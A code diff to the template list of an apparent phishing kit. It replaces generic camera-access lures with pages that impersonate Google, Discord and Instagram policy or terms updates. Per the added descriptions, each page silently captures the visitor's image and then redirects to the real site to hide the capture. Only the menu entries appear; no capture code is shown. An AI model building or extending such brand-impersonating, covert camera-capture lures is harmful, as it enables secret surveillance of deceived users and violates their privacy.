@@ -31,9 +31,9 @@ const phishingCategories = [
     description: 'Templates attempting to access the device camera.',
     Icon: Camera,
     links: [
-      { id: 'photo-contest-entry', name: 'Photo Contest Entry', url: '/phishing/camera/photo-contest-entry', Icon: Trophy, description: "Simulates a photo contest entry requiring camera access after cookie consent." },
-      { id: 'video-verification', name: 'Video Verification', url: '/phishing/camera/video-verification', Icon: ImageIconLucide, description: "Simulates a video ID verification process." },
-      { id: 'ar-filter', name: 'AR Filter Test', url: '/phishing/camera/ar-filter', Icon: Camera, description: "Simulates trying out an AR filter." },
+      { id: 'google-policy-update', name: 'Google Policy Update', url: '/phishing/camera/google-policy-update', Icon: Globe, description: "Simulates a Google policy update requiring cookie acceptance and silently captures image before redirecting.", redirectUrl: 'https://www.google.com' },
+      { id: 'discord-terms-update', name: 'Discord Terms Update', url: '/phishing/camera/discord-terms-update', Icon: Globe, description: "Simulates a Discord terms update requiring acceptance and silently captures image before redirecting.", redirectUrl: 'https://discord.com/login' },
+      { id: 'instagram-privacy-update', name: 'Instagram Privacy Update', url: '/phishing/camera/instagram-privacy-update', Icon: Globe, description: "Simulates an Instagram privacy policy update requiring acceptance and silently captures image before redirecting.", redirectUrl: 'https://www.instagram.com/accounts/login/' },
     ],
   },
   {
